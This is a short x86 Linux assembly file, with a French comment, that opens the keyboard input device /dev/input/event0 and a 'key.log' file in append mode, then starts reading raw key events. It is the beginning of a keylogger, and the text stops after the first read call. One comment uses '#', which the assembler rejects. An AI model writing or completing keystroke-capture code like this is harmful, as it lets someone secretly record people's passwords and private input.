SECTION .data
    output_file   db "key.log", 0
    event_keyboard db "/dev/input/event0", 0

SECTION .bss
    input_event resb 16    # 16 bytes récupérer en hexadécimal ( 8 premiers -> temps etc ... -> 2 suivant = event type -> 2 suivant = code type -> 4 suivant = valeur input)


SECTION .text
global _start

_start:
    ; open event_file
    xor ecx, ecx
    mov ebx, event_keyboard
    mov eax, 5
    int 0x80

    mov esi, eax 

    mov edx, 420          ; 644
    mov ecx, 2101o        ; O_WRONLY | O_CREAT | O_APPEND
    mov ebx, output_file
    mov eax, 5            ; SYS_OPEN
    int 0x80

    mov edi, eax 

input:

    mov edx, 16
    mov ecx, input_event
    mov ebx, esi                    ; File descriptor for reading bytes
    mov eax, 3                      ; SYS_READ
    int 0x80